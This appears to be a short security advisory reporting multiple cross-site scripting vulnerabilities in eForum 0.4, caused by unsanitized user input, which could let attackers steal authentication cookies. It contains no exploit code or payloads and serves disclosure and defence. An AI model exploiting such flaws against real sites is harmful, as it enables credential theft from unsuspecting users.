eForum is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.

Exploiting these vulnerabilities may allow an attacker to perform cross-site scripting attacks on unsuspecting users in the context of the affected website. As a result, the attacker may be able to steal cookie-based authentication credentials and to launch other attacks.

These issues affect eForum 0.4; other versions may also be affected.
